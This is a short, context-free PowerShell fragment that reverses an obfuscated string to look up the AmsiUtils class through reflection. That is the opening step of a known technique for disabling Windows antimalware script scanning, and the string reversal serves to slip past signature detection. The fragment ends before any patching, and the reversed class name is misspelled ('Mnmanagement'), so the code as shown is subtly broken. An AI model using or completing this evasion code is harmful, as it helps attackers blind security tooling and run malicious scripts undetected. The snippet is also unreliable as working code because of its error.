
 $rev = 'slitUismA.noitamotuA.tnemeganamnM.metsyS'
 $arr = $rev.ToCharArray()
[Array]::Reverse($arr)
 $n = -join $arr
 $g = [Ref].Assembly.GetType($n)
